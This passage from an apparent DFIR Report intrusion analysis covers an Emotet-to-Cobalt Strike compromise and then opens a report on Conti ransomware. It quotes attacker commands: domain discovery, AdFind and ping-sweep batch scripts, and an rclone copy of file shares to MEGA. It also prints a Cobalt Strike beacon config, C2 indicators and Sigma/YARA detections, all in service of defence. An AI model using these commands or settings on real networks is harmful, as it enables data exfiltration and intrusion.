Files\Common Files\Microsoft Shared\Ink\IpsPlugin.dll+53c9|C:\Windows\System32\KERNEL32.DLL+17034|C:\Windows\SYSTEM32\ntdll.dll+52651 
EventID: 17 EventType: CreatePipe Image: C:\Windows\system32\SearchIndexer.exe PipeName: \SearchTextHarvester Shortly after the credential dump using the SearchIndexer process, the Cobalt Strike process ran Invoke-Kerberoast looking for roastable accounts within the organization. 
We observed Cobalt Strike beacons accessing LSASS on multiple occasions, on almost every compromised host. 
Discovery On the first day of the intrusion, the Emotet malware performed some basic discovery tasks on the host using built in Windows utilities. 
systeminfo ipconfig /all 
On the second day, the hands on activity from Cobalt Strike performed a more thorough examination of that host’s Windows domain. 
C:\Windows\system32\cmd.exe /C
net group "Domain Computers" /domain C:\Windows\system32\cmd.exe /C
net group /domain
"Domain Admins" C:\Windows\system32\cmd.exe /C
"Enterprise Admins" C:\Windows\system32\cmd.exe /C
systeminfo C:\Windows\system32\cmd.exe /C
net users C:\Windows\system32\cmd.exe /C
nltest /DOMAIN_TRUSTS 
The threat actors launched the PowerView module, Invoke-Sharefinder, from almost all of the hosts to which they pivoted, including the domain controller. 
AdFind.exe, the command-line Active Directory query tool, was run on only one of the compromised hosts via the find.bat batch script.
The contents of the script are below: find.exe -f "(objectcategory=person)" > ad_users.txt find.exe -f "objectcategory=computer" > ad_computers.txt find.exe -f "(objectcategory=organizationalUnit)" > ad_ous.txt find.exe -sc trustdmp > trustdmp.txt find.exe -subnets -f (objectCategory=subnet)> subnets.txt find.exe -f "(objectcategory=group)" > ad_group.txt find.exe -gcb -sc trustdmp > trustdmp.txt echo end Using the data collected from previous activity, they created a target list which was then fed to a batch script named p.bat.
The batch file contained one line, which pinged a list of servers (servers.txt). 
The line can be seen below: for /f
%%i in (SERVERS.txt) do ping
%%
i -n 1 >> res.txt Additionally, the threat actors displayed the share directories using dir.exe via the interactive shell from the Cobalt Strike beacon. 
Lateral Movement The Cobalt Strike jump psexec (Run service EXE on the remote host) produced a 7045 System Windows event on remote hosts.
Example: Below, the network traffic shows the SMB lateral transfer of one of the Atera Agent MSI installers (1.msi) used to gain access laterally on a host and provide persistence for later access. 
The same can be observed for other payloads used during the intrusion as well; here we can see that same data using Zeek logs when the threat actors transferred the 1.dll Cobalt Strike beacon laterally to gain access to additional hosts. 
We also observed Pass-The-Hash used throughout the intrusion via the Cobalt Strike Beacons.
Threat actors used PTH to acquire a session with elevated user access.
We observed the below logs being generated on the source host and domain controller that indicate the use of PTH. 
Source Host: - Windows EID 4624 Logon Type = 9 Authentication Package = Negotiate Logon Process = seclogo - Windows EID 467 Domain Controller: - Windows EID 4776 
You can read more about detecting “Pass-The-Hash” here by Stealthbits and here by Hausec. 
Command and Control Emotet In the Emotet Excel document, the following URLs are hard coded, and obfuscated, to download the second stage. 
https[:]//lopespublicidade[.]com/cgi-bin/e5R5oG4iEaQnxQrZDh/ https[:]//bosny[.]com/aspnet_client/rnMp0ofR/ http[:]//seasidesolutions[.]com/cgi-bin/WLoO6sEzYCJ3LTlC/ http[:]//borgelin[.]org/belzebub/okwRWz1C/ http[:]//loa-hk[.]com/wp-content/ffBag/ The second stage of Emotet has a set of hard-coded IPs that it tries to connect to after the DLL is executed. 
hxxps[://]103[.]133[.]214[.]242/ hxxps[://]103[.]133[.]214[.]242:8080/ hxxps[://]103[.]41[.]204[.]169/ hxxps[://]103[.]41[.]204[.]169:8080/ hxxps[://]103[.]42[.]58[.]120/ hxxps[://]103[.]42[.]58[.]120:7080/ hxxps[://]103[.]56[.]149[.]105/ hxxps[://]103[.]56[.]149[.]105:8080/ hxxps[://]103[.]8[.]26[.]17/ hxxps[://]103[.]8[.]26[.]17:8080/ hxxps[://]104[.]248[.]225[.]227/ hxxps[://]104[.]248[.]225[.]227:8080/ hxxps[://]110[.]235[.]83[.]107/ hxxps[://]110[.]235[.]83[.]107:7080/ hxxps[://]116[.]124[.]128[.]206/ hxxps[://]116[.]124[.]128[.]206:8080/ hxxps[://]118[.]98[.]72[.]86/ hxxps[://]134[.]122[.]119[.]23/ hxxps[://]134[.]122[.]119[.]23:8080/ hxxps[://]139[.]196[.]72[.]155:8080/ hxxps[://]159[.]69[.]237[.]188/ hxxps[://]175[.]126[.]176[.]79/ hxxps[://]175[.]126[.]176[.]79:8080/ hxxps[://]178[.]62[.]112[.]199/ hxxps[://]178[.]62[.]112[.]199:8080/ hxxps[://]185[.]148[.]168[.]220/ hxxps[://]185[.]148[.]168[.]220:8080/ hxxps[://]188[.]225[.]32[.]231/ hxxps[://]188[.]225[.]32[.]231:4143/ hxxps[://]190[.]90[.]233[.]66/ hxxps[://]194[.]9[.]172[.]107/ hxxps[://]194[.]9[.]172[.]107:8080/ hxxps[://]195[.]154[.]146[.]35/ hxxps[://]195[.]77[.]239[.]39/ hxxps[://]195[.]77[.]239[.]39:8080/ hxxps[://]196[.]44[.]98[.]190/ hxxps[://]196[.]44[.]98[.]190:8080/ hxxps[://]202[.]134[.]4[.]210/ hxxps[://]202[.]134[.]4[.]210:7080/ hxxps[://]202[.]28[.]34[.]99/ hxxps[://]202[.]28[.]34[.]99:8080/ hxxps[://]202[.]29[.]239[.]162/ hxxps[://]203[.]153[.]216[.]46/ hxxps[://]207[.]148[.]81[.]119/ hxxps[://]207[.]148[.]81[.]119:8080/ hxxps[://]210[.]57[.]209[.]142/ hxxps[://]210[.]57[.]209[.]142:8080/ hxxps[://]217[.]182[.]143[.]207/ hxxps[://]36[.]67[.]23[.]59/ hxxps[://]37[.]44[.]244[.]177/ hxxps[://]37[.]44[.]244[.]177:8080/ hxxps[://]37[.]59[.]209[.]141/ hxxps[://]37[.]59[.]209[.]141:8080/ hxxps[://]45[.]71[.]195[.]104:8080/ hxxps[://]5[.]56[.]132[.]177:8080/ hxxps[://]51[.]68[.]141[.]164:8080/ hxxps[://]54[.]37[.]106[.]167:8080/ hxxps[://]54[.]37[.]228[.]122/ hxxps[://]54[.]38[.]143[.]246/ hxxps[://]54[.]38[.]143[.]246:7080/ hxxps[://]54[.]38[.]242[.]185/ hxxps[://]59[.]148[.]253[.]194/ hxxps[://]62[.]171[.]178[.]147:8080/ hxxps[://]66[.]42[.]57[.]149/ hxxps[://]68[.]183[.]91[.]111/ hxxps[://]68[.]183[.]91[.]111:8080/ hxxps[://]68[.]183[.]93[.]250/ hxxps[://]78[.]46[.]73[.]125/ hxxps[://]78[.]47[.]204[.]80/ hxxps[://]85[.]214[.]67[.]203/ hxxps[://]85[.]214[.]67[.]203:8080/ hxxps[://]85[.]25[.]120[.]45/ hxxps[://]85[.]25[.]120[.]45:8080/ hxxps[://]87[.]106[.]97[.]83/ hxxps[://]87[.]106[.]97[.]83:7080/ hxxps[://]88[.]217[.]172[.]165/ hxxps[://]88[.]217[.]172[.]165:8080/ hxxps[://]93[.]104[.]209[.]107/ hxxps[://]93[.]104[.]209[.]107:8080/ Cobalt Strike Emotet, later on, deployed Cobalt Strike for additional functionality. 
59.95.98.204 JA3:
72a589da586844d7f0818ce684948eea JA3S: f176ba63b4d68e576b5ba345bec2c7b7 Certificate: [66:f7:4c:f9:56:5d:fe:15:a6:8c:62:b9:3d:72:cb:8e:c9:e9:89:02] Not Before: 2022/05/19 12:22:46 UTC Not After: 2023/05/19 12:22:46 (UTC) Issuer Org: jQuery Subject Common: jquery.com { "beacontype": [ "HTTP" ], "sleeptime": 45000, "jitter": 37, "maxgetsize": 1403644, "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==", "license_id": 206546002, "cfg_caution": false, "kill_date": null, "server": { "hostname": "59.95.98.204", "port": 8080, "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCfWiK6EPk2D2Ho7CBgdUfK2kqa/1x2L0Tt0R4Pl/Sof+7skIOqclxG1PeQTbc0VYagoqiuCJCn/QQd8pJBzci5GMTtdrzcKqZXQBy3Rv7Sfv9v8MZQfU2UVrRgVChdAetwPDdSMAa5tsNhEKBDfpbpmhmXsjN10rW6mfPYu+kzuwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" }, "host_header": "", "useragent_header": null, "http-get": { "uri": "/jquery-3.3.1.min.js", "verb": "GET", "client": { "headers": null, "metadata": null }, "server": { "output": [ "print", "append 1522 characters", "prepend 84 characters", "prepend 3931 characters", "base64url", "mask" ] } }, "http-post": { "uri": "/jquery-3.3.2.min.js", "verb": "POST", "client": { "headers": null, "id": null, "output": null } }, "tcp_frame_header": "AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "crypto_scheme": 0, "proxy": { "type": null, "username": null, "password": null, "behavior": "Use IE settings" }, "http_post_chunk": 0, "uses_cookies": true, "post-ex": { "spawnto_x86": "%windir%\\syswow64\\dllhost.exe", "spawnto_x64": "%windir%\\sysnative\\dllhost.exe" }, "process-inject": { "allocator": "NtMapViewOfSection", "execute": [ "CreateThread 'ntdll!RtlUserThreadStart'", "CreateThread", "NtQueueApcThread-s", "CreateRemoteThread", "RtlCreateUserThread" ], "min_alloc": 17500, "startrwx": false, "stub": "yl5rgAigihmtjA5iEHURzg==", "transform-x86": [ "prepend '\\x90\\x90'" ], "transform-x64": [ "prepend '\\x90\\x90'" ], "userwx": false }, "dns-beacon": { "dns_idle": null, "dns_sleep": null, "maxdns": null, "beacon": null, "get_A": null, "get_AAAA": null, "get_TXT": null, "put_metadata": null, "put_output": null }, "pipename": null, "smb_frame_header": "AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "stage": { "cleanup": true }, "ssh": { "hostname": null, "port": null, "username": null, "password": null, "privatekey": null } } Atera and Splashtop Threat actors used Atera and Splashtop remote access tools on two compromised hosts during the intrusion.
Atera granted the threat actors with interactive access.
We cannot, however, confirm that the threat actors utilized this access because the majority of activity originated through the Cobalt Strike beacons. 
Exfiltration The threat actors used Rclone to exfiltrate sensitive data to MEGA.io cloud storage.
Command line logging revealed the destination to be the Mega service and the network shares targeted. 
rclone.exe, copy, \\REDACTED\Shares, mega:Shares, -q, --ignore-existing, --auto-confirm, --multi-thread-streams, 4, --transfers, 4 This activity was also visible on the network via Zeek logs showing the SMB share connection activity. 
Actions on Objectives Emotet has for some time been used as an initial access broker for various intrusions; however, some Emotet infections get tasked with continuing the delivery of new campaigns.
In this intrusion, we observed both tasks occurring during the same time with both the delivery of access to the threat actor utilizing Cobalt Strike and exfiltrating data from the network, all the while, the original Emotet malware was tasked to deliver new malicious emails. 
The Emotet mailer started roughly once each day during the intrusion.
Marked by bursts of connection to various email servers. 
The emails were sent through various compromised email accounts, propagating additional malicious xls files to further propagate Emotet access. 
We did not see any further activity but we believe if given enough time, this would have ended with domain wide ransomware.
We have a case coming up in a few weeks where it does exactly that. 
Indicators File: info_1805.xls acd3d4e8f63f52eaf57467a76ca2389d 
4a42b5e7e7fd43ddefc856f45bb95d97656ddca6 e598b9700e13f2cb1c30c6d9230152ed5716a6d6e25db702576fefeb6638005e 1.dll 27d0b9e38cdc9a31fa9271c0bbf5d393 e96980812c287c9d27be9181bcf08727cc9f457a 1b9c9e4ed6dab822b36e3716b1e8f046e92546554dff9bdbd18c822e18ab226b find.bat c96b2b5b52ef0013b841d136ddab0f49 22cc2bc032ae327de9f975e9122b692e4474ac15 5a5c601ede80d53e87e9ccb16b3b46f704e63ec7807e51f37929f65266158f4c p.bat adf2b487134ffcd7999e419318dfdf8d 91c54877440d14538be22d662e7f47e29ab219bf fd72a9313f8564b57ebd18791a438216d289d4a97df3f860f1fc585a001265d9 llJyMIOvft.dll e984f812689ec7af136a151a19b2d56c 88591ad3806c0a1e451c744d4942e99e9a5d2ff7 2b2e00ed89ce6898b9e58168488e72869f8e09f98fecb052143e15e98e5da9df UOmCgbXygCe.exe 592155bbbab05ac1f818cfd9eb53b672 82070d19c26e0f7e255168e1f2364174215aa0de f4c085ef1ba7e78a17a9185e4d5e06163fe0e39b6b0dc3088b4c1ed11c0d726b Network: Cobalt Strike: 59.95.98.204:8080http://59.95.98.204:8080/jquery-3.3.1.min.js Emotet: 103.8.26.17:8080 134.122.119.23:8080 54.38.143.246:7080 202.29.239.162:443 Detections Network Suricata rules: ET DROP Spamhaus DROP Listed Traffic Inbound group 13 ET CNC Feodo Tracker Reported CnC Server group 9 ET CNC Feodo Tracker Reported CnC Server group 12 ET MALWARE Cobalt Strike Malleable C2 JQuery Custom Profile M2 ET MALWARE Cobalt Strike Beacon Activity (GET) ET MALWARE Cobalt Strike Malleable C2 JQuery Custom Profile Response ET MALWARE Cobalt Strike Activity (POST) ET CNC Feodo Tracker Reported CnC Server group 22 ET POLICY SMB Executable File Transfer ET RPC DCERPC SVCCTL - Remote Service Control Manager Access ET CNC Feodo Tracker Reported CnC Server group 24 ET MALWARE W32/Emotet CnC Beacon 3 Sigma https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/ateraagent_malicious_installations.yml title: AteraAgent malicious installations id: fb0f2d48-269d-473e-9afc-c540a16a990f description: Detects potentially malicious AteraAgent installations when the IntegratorLogin parameter is used to register a non-business email. 
status: experimental date: 2022/09/12 author: '@kostastsale, @TheDFIRReport' logsource: category: process_creation product: windows detection: selection1: Image: - '*\AteraAgent.exe' CommandLine|contains|all: - '/i ' - 'IntegratorLogin=' selection2: CommandLine|contains: 
# Feel free to modify the email addresses to fit your needs - '@gmail.com' - '@hotmail.com' - '@hotmail.com' - '@yandex.ru' - '@mail.ru' - '@outlook.com' - '@protonmail.com' - '@dropmail.me' condition: selection1 and selection2 falsepositives: - Unlikely level: high tags: - attack.execution - attack.
T1059.006 https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rclone_smb_share_exfiltration.yml title: Rclone SMB Share Exfiltration id: 889bc648-5164-44f4-9388-fb5d6b58a7b2 status: Experimental description: Detection of a exfiltration activity using rclone from Windows network shares using SMB. author: \@TheDFIRReport date: 2022/09/12 references: - https://thedfirreport.com/ logsource: product: zeek service: smb_files detection: selection: file_name|endswith: - '\rclone.exe' condition: selection falsepositives: - Approved business backup processes. 
level: medium tags: - attack.exfiltration - attack.t567.002 https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/potential_smb_dll_lateral_movement.yml title: Potential SMB DLL Lateral Movement id: 8fe1524e-8c97-404c-9dee-090929a315c4 status: Experimental description: Detection of potential us of SMB to transfer DLL's into the ProgramData folder of hosts for purposes of lateral movement. 
author: \@TheDFIRReport date: 2022/09/12 references: - https://thedfirreport.com/ logsource: product: zeek service: smb_files detection: selection_1: file_name|contains: - 'programdata' selection_2: file_name|endswith: - '\.dll' condition: selection_1 and selection_2 falsepositives: - RMM Tools and Administrative activities in ProgramData Folder. level: medium tags: - attack.lateral_movement - attack.t1570 Yara https://github.com/The-DFIR-Report/Yara-Rules/blob/main/case_14335.yar /* YARA Rule Set Author: The DFIR Report Date: 2022-09-12 Identifier:
Emotet Case 14335 Reference: https://thedfirreport.com */ /*
Rule Set -----------------------------------------------------------------
*/ import "pe" rule llJyMIOvft_14335 { meta: description = "llJyMIOvft.dll" author = "The DFIR Report" reference = "https://thedfirreport.com" date = 2022-09-12" hash1 = "2b2e00ed89ce6898b9e58168488e72869f8e09f98fecb052143e15e98e5da9df" strings: $s1 = "Project1.dll" fullword ascii $s2 = "!>v:\"6;" fullword ascii $s3 = "y6./XoFz_6fw%r:6*" fullword ascii $s4 = "u3!RuF%OR_O*^$nw7&<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">" fullword ascii $s5 = "*/B+ n" fullword ascii $s6 = "ZnwFY66" fullword ascii $s7 = "1!f%G%w" fullword ascii $s8 = "QKMaXCL6" fullword ascii $s9 = "IMaRlh9" fullword ascii $s10 = "_BZRDe'7&7<<!{nBLU" fullword ascii $s11 = "lw7\"668!qZNL_EIS7IiMa" fullword ascii $s12 = "IS6\\JMtdHh0Piw2/PuH" fullword ascii $s13 = "iw#!RuF%OR__*^$nw76668!qZNL_EYS7I" fullword ascii $s14 = ".RuF%LR__*^$" fullword ascii $s15 = "^<_EHJ3IPLPeZX0Phg7!BAK%_" fullword ascii $s16 = "ilG8Rn\"2OIkY*E%zw'v669(pZGn_EH_6IE" fullword ascii $s17 = "ilg7Rnr0OI^]*JTnw6\"76<" fullword ascii $s18 = "Broken pipe" fullword ascii /*
Goodware String - occured 742 times */ $s19 = "Permission denied" fullword ascii /*
Goodware String - occured 823 times */ $s20 = "v)(Ro\">OHkU*D%xw9" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 3000KB and ( pe.imphash() == "066c972d2129d0e167d371a0abfcf03b" and ( pe.exports("YAeJyEAYL7F4eDck6YUaf") and pe.exports("fmFkmnQYB5TC2Sq5NGFkK") and pe.exports("nrDjhnkd9nedaQwcCY") ) or 12 of them ) } rule UOmCgbXygCe_14335 { meta: 
description = "UOmCgbXygCe.exe" author = "The DFIR Report" reference = "https://thedfirreport.com" date = "2022-09-12" hash1 = "f4c085ef1ba7e78a17a9185e4d5e06163fe0e39b6b0dc3088b4c1ed11c0d726b" strings: $s1 = "runsuite.log" fullword ascii $s2 = "AppPolicyGetProcessTerminationMethod" fullword ascii $s3 = "f73.exe" fullword ascii $s4 = "Processing test line %ld %s leaked %d" fullword ascii $s5 = "Internal error: xmlSchemaTypeFixup, complex type '%s': the <simpleContent><restriction> is missing a <simpleType> child, but was" ascii $s6 = "The target namespace of the included/redefined schema '%s' has to be absent or the same as the including/redefining schema's tar" ascii $s7 = "The target namespace of the included/redefined schema '%s' has to be absent, since the including/redefining schema has no target" ascii $s8 = "A <simpleType> is expected among the children of <restriction>, if <simpleContent> is used and the base type '%s' is a complex t" ascii $s9 = "there is at least one entity reference in the node-tree currently being validated.
Processing of entities with this XML Schema p" ascii $s10 = "## %s test suite for Schemas version %s" fullword ascii $s11 = "Internal error: %s, " fullword ascii $s12 = "If <simpleContent> and <restriction> is used, the base type must be a simple type or a complex type with mixed content and parti" ascii $s13 = "For a string to be a valid default, the type definition must be a simple type or a complex type with simple content or mixed con" ascii $s14 = "For a string to be a valid default, the type definition must be a simple type or a complex type with mixed content and a particl" ascii $s15 = "Could not open the log file, running in verbose mode" fullword ascii $s16 = "not validating will not read content for PE entity %s" fullword ascii $s17 = "Skipping import of schema located at '%s' for the namespace '%s', since this namespace was already imported with the schema loca" ascii $s18 = "(annotation?, (simpleContent | complexContent | ((group | all | choice | sequence)?
, ((attribute | attributeGroup)
*, anyAttribut" ascii $s19 = "get namespace" fullword ascii $s20 = "instance %s fails to parse" fullword ascii condition: uint16(0) == 0x5a4d and filesize <
7000KB and ( pe.imphash() == "bcf185f1308ffd9e4249849d206d9d0c" and pe.exports("xmlEscapeFormatString") or 12 of them ) } rule info_1805_14335 { meta: description = "info_1805.xls" author = "The DFIR Report" reference = "https://thedfirreport.com" date = "2022-09-12" hash1 = "e598b9700e13f2cb1c30c6d9230152ed5716a6d6e25db702576fefeb6638005e" strings: $s1 = "32.exe" fullword ascii $s2 = "System32\\X" fullword ascii $s3 = "DocumentOwnerPassword" fullword wide $s4 = "DocumentUserPassword" fullword wide $s5 = "t\"&\"t\"&\"p\"&\"s:\"&\"//lo\"&\"pe\"&\"sp\"&\"ub\"&\"li\"&\"ci\"&\"da\"&\"de.c\"&\"o\"&\"m/cgi-bin/e\"&\"5R\"&\"5o\"&\"G4\"&\"" ascii $s6 = "UniresDLL" fullword ascii $s7 = "OEOGAJPGJPAG" fullword ascii $s8 = "\\Windows\\" fullword ascii $s9 = "_-* #,##0.00_-;\\-* #,##0.00_-;_-* \"-\"??_-;[email protected]_-" fullword ascii $s10 = "_-* #,##0_-;\\-* #,##0_-;_-* \"-\"_-;[email protected]_-" fullword ascii $s11 = "_-;_-*
\"" fullword ascii $s12 = "^{)P -z)"
fullword ascii $s13 = "ResOption1" fullword ascii $s14 = "DocumentSummaryInformation" fullword wide /*
Goodware String - occured 41 times */ $s15 = "Root Entry" fullword wide /*
Goodware String - occured 46 times */ $s16 = "SummaryInformation" fullword wide /*
Goodware String - occured 50 times */ $s17 = "A\",\"JJCCBB\"" fullword ascii $s18 = "Excel 4.0" fullword ascii $s19 = "Microsoft Print to PDF" fullword wide $s20 = "\"_-;\\-* #,##0.00\\ \"" fullword wide /*
Goodware String - occured 1 times */ condition: uint16(0) == 0xcfd0 and filesize < 200KB and all of them } rule cobalt_strike_14435_dll_1 { meta: description = "1.dll" author = "The DFIR Report" reference = "https://thedfirreport.com" date = "2022-09-12" hash1 = "1b9c9e4ed6dab822b36e3716b1e8f046e92546554dff9bdbd18c822e18ab226b" strings: $s1 = "curity><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requeste" ascii $s2 = "CDNS Project.dll" fullword ascii $s3 = "hemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware></windowsSettings></application></assembly>" fullword ascii $s4 = "Hostname to lookup:" fullword wide $s5 = "Hostnames:" fullword wide $s6 = "wOshV- D3\"[email protected] \\" fullword ascii $s7 = "T4jk{zrvG#@KRO* d'z" fullword ascii $s8 = "CDNS Project Version 1.0" fullword wide $s9 = "zK$%S.cPO>rtW" fullword ascii $s10 = "vOsh.HSDiXRI" fullword ascii $s11 = "l4p.oZewOsh7zP" fullword ascii $s12 = "5p2o.ewOsh7H" fullword ascii $s13 = "h7H.DiX" fullword ascii $s14 = "l4pWo.ewOsh[H%DiXRI" fullword ascii $s15 = "rEWS).lpp~o" fullword ascii $s16 = ",m}_lOG" fullword ascii $s17 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3" ascii $s18 = "vileges></security></trustInfo><application xmlns=\"urn:schemas-microsoft-com:asm.v3\"><windowsSettings><dpiAware xmlns=\"http:/" ascii $s19 = "tn9- 2" fullword ascii $s20 = "PDiXRI7" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 8000KB and ( pe.imphash() == "d1aef4e37a548a43a95d44bd2f8c0afc" or 8 of them ) } rule cobalt_strike_14435_dll_2 { meta: description = "32.dll" author = "The DFIR Report" reference = "https://thedfirreport.com" date = "2022-09-12" hash1 = "76bfb4a73dc0d3f382d3877a83ce62b50828f713744659bb21c30569d368caf8" strings: $x1 = "mail glide drooping dismiss collation production mm refresh murderer start parade subscription accident retorted carter stalls r" ascii $s2 = "vlu405yd87.dll" fullword ascii $s3 = "XYVZSWWVU" fullword ascii /* base64 encoded string 'aVRYeT' */ $s4 = "ZYWVWSXVT" fullword ascii /* base64 encoded string 'aeVIuS' */ $s5 = "WXVZTVVUVX" fullword ascii /* base64 encoded string 'YuYMUTU' */ $s6 = "ZYXZXSWZW" fullword ascii /* base64 encoded string 'avWIfV' */ $s7 = "SZWVSZTVU" fullword ascii /* base64 encoded string 'eeRe5T' */ $s8 = "VXVWUWVZYY" fullword ascii /* base64 encoded string 'UuVQeYa' */ $s9 = "VSXZZYSVU" fullword ascii /* base64 encoded string 'IvYa%T' */ $s10 = "VXUZUVWVU" fullword ascii /* base64 encoded string ']FTUeT' */ $s11 = "SVVZZXZUVW" fullword ascii /* base64 encoded string 'IUYevTU' */ $s12 = "USVZVSWVZ" fullword ascii /* base64 encoded string 'IVUIeY' */ $s13 = "SWVVTVSVWWXZZVVV" fullword ascii /* base64 encoded string 'YUSU%VYvYUU' */ $s14 = "VSXVUXXZS" fullword ascii /* base64 encoded string 'IuT]vR' */ $s15 = "WSVZYWZWWW" fullword ascii /* base64 encoded string 'Y%YafVY' */ $s16 = "XUSZXXVVW" fullword ascii /* base64 encoded string 'Q&W]UV' */ $s17 = "ZWZWZVZWWWZ" fullword ascii /* base64 encoded string 'efVeVVYf' */ $s18 = "STZVYVVZYS" fullword ascii /* base64 encoded string 'I6UaUYa' */ $s19 = "ZWZWYSZXUZ" fullword ascii /* base64 encoded string 'efVa&WQ' */ $s20 = "SVVWWVVVWW" fullword ascii /* base64 encoded string 'IUVYUUY' */ condition: uint16(0) == 0x5a4d and filesize < 2000KB and ( pe.imphash() == "4e03b8b675969416fb0d10e8ab11f7c2" or ( 1 of ($x*) or 12 of them ) ) } rule find_bat_14335 { meta: description = "Find.bat using AdFind" author = "The DFIR Report" reference = "https://thedfirreport.com" date = "2022-09-12" hash1 = "5bc00ad792d4ddac7d8568f98a717caff9d5ef389ed355a15b892cc10ab2887b" strings: $x1 = "find.exe" nocase wide ascii $s1 = "objectcategory" nocase wide ascii $s2 = "person" nocase wide ascii $s3 = "computer" nocase wide ascii $s4 = "organizationalUnit" nocase wide ascii $s5 = "trustdmp" nocase wide ascii condition: filesize < 1000 and 1 of ($x*) and 4 of ($s*) } rule adfind_14335 { meta: description = "Find.bat using AdFind" author = "The DFIR Report" reference = "https://thedfirreport.com" date = "2022-09-12" hash1 = "b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682" strings: $x1 = "joeware.net" nocase wide ascii $s1 = "xx.cpp" nocase wide ascii $s2 = "xxtype.cpp" nocase wide ascii $s3 = "Joe Richards" nocase wide ascii $s4 = "RFC 2253" nocase wide ascii $s5 = "RFC 2254" nocase wide ascii condition: uint16(0) == 0x5a4d and filesize < 2000KB and 1 of ($x*) or 4 of ($s*) } rule p_bat_14335 { meta: description = "Finding bat files that is used for enumeration" author = "The DFIR Report" reference = "https://thedfirreport.com" date = "2022-09-12" strings: $a1 = "for /f
%%i in" nocase wide ascii $a2 = "do ping
%%i" nocase wide ascii $a3 = "-n 1 >>" nocase wide ascii $a4 = "res.txt" nocase wide ascii condition: filesize < 2000KB and all of ($a*)} MITRE Dynamic-link Library Injection - T1055.001 Component Object Model - T1559.001 PowerShell - T1059.001 Regsvr32 - T1218.010 Pass the Hash - T1550.002 Domain Groups - T1069.002 Domain Account - T1087.002 Domain Trust Discovery - T1482 Malicious File - T1204.002 SMB/Windows Admin Shares - T1021.002 Lateral Tool Transfer - T1570 Process Injection - T1055 Exfiltration to Cloud Storage - T1567.002 Thread Execution Hijacking - T1055.003 Remote System Discovery - T1018 System Information Discovery - T1082 Application Layer Protocol - T1071 Network Share Discovery - T1135 Kerberoasting - T1558.003 LSASS Memory - T1003.001 Registry Run Keys / Startup Folder - T1547.001 Phishing - T1566 Spearphishing Attachment - T1566.001 Internal case #14335 
title: Conti Ransomware url: https://thedfirreport.com/2021/05/12/conti-ransomware/ Introduction First seen in May 2020, Conti ransomware has quickly become one of the most common ransomware variants, according to Coveware.
As per Coveware’s Quarterly Ransomware Report (Q1 2021), Conti has the 2nd highest market share after Sodinokibi, which we wrote about here. 
In April, we saw a threat actor go from an initial IcedID infection to deploying Conti ransomware domain wide in two days and 11 hours.
The threat actors stayed dormant for most of this time, before jumping into action on an early Saturday morning.
The hands on keyboard activity lasted for two and a half hours.
They utilized RDP, PsExec, and Cobalt Strike to move laterally within the environment before executing Conti in memory across all active systems. 
Summary We assess with moderate confidence that the initial vector used by the threat actor was a zip file, which included a malicious JavaScript file, delivered through a phishing campaign.
The JavaScript file would eventually download and execute the IcedID malware.
Discovered in 2017, what started as a commodity malware is now currently being deployed as an initial access broker by ransomware threat actors. 
While there was some initial discovery activity from the IcedID malware, it went quiet, just beaconing to command and control but not performing any other activity.
After being dormant for over two days, a Cobalt Strike Beacon was dropped and executed on the system infected with IcedID.
The threat actors then ran another round of discovery activity with native windows utilities such as nltest.exe, whoami.exe, and net.exe.
They then successfully escalated to SYSTEM privileges via Cobalt Strike’s built-in “named pipe impersonation” (GetSystem) functionality. 
The threat actors continued by moving laterally to the domain controllers on the network using SMB to transfer and execute a Cobalt Strike Beacon.
During that time, we observed port scanning activity from one of the domain controllers, to identify open ports such as SSH, SMB, MSSQL, RDP and WinRM.
After a brief gap of 15 minutes, the threat actors used PsExec, to copy and execute a Cobalt Strike Beacon DLL on most of the systems in the network. 
Later in the attack, the threat actor was seen establishing RDP connections from the beachhead host to the domain controller and other systems throughout the environment.
This RDP activity was being proxied through the IcedID process running on that host, to a remote proxy over port 8080. 
To establish persistence, the attackers created a new local user on one of the domain controllers and added it to the Administrators group.
Additionally, in an effort to evade any detection and prevention mechanisms, they disabled Windows Defender via a group policy modification. 
Within two and a half hours of Cobalt Strike showing up in the environment and just over two days after the initial IcedID infection, the threat actors completed their objective of encrypting all systems.
Conti was executed in memory with the help of the Cobalt Strike Beacons domain wide.
The ransomware note left by the infection included a link to their Tor site for further details. 
After further review of the environment (post encryption), we realized multiple systems (including a domain controller) were unable to be accessed and would not have been restorable even if the ransom had been paid. 
Services We offer multiple services including a Threat Feed service which tracks Cobalt Strike, Metasploit, Empire, PoshC2, etc.
More information on this service and others can be found here. 
We also have artifacts available from this case such as pcaps, memory captures, files, Kape packages, and more, under our Security Researcher and Organization services. 
Timeline Analysis and reporting completed by @pigerlin, @MetallicHack, @yatinwad, and 1 unnamed contributor. 
Reviewed by @kostastsale, @RoxpinTeddy, and @TheDFIRReport MITRE ATT&CK Initial Access The IcedID DLL that we executed was most likely dropped through a zip file, which included a JavaScript file within it.
Brad had a few posts about these around the time of this intrusion.
1 2 Thanks Brad! 
